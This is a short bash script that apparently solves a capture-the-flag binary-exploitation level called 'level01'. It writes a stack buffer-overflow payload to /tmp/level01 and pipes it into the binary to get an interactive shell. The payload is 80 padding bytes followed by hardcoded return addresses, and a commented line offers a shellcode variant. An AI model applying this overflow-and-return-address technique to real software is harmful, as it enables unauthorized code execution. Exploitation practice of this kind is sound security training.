#!/usr/bin/env bash

. /tmp/init.sh


python -c 'print "dat_wil" + "\n" + "" + 80 * "A" + "\xd0\xae\xe6\xf7"  + "\xc4\x45\xee\xf7" + "\xec\x97\xf8\xf7"' > /tmp/level01

# also shellcode

#python -c 'import os; print "dat_wil" + "\n" + 80 * "A" + os.getenv("SCADDR")' > /tmp/level01

cat /tmp/level01 - | ./level01
